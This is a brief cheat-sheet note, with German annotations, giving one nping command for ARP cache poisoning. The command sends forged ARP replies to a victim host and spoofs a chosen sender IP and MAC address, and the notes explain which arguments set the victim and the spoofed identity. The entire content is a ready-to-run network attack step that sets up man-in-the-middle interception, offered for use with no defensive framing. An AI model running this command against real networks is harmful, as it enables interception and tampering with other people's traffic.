# nping

**ARP cache poisoning**

`sudo nping --arp --arp-type "ARP-reply" --arp-sender-ip "10.10.0.31" --arp-sender-mac "7c:50:79:7f:47:07" 10.10.0.20`

* Victim = IP am Ende (.20)
* zu spoofende IP/MAC mit `--arp-sender-[ip|mac]`
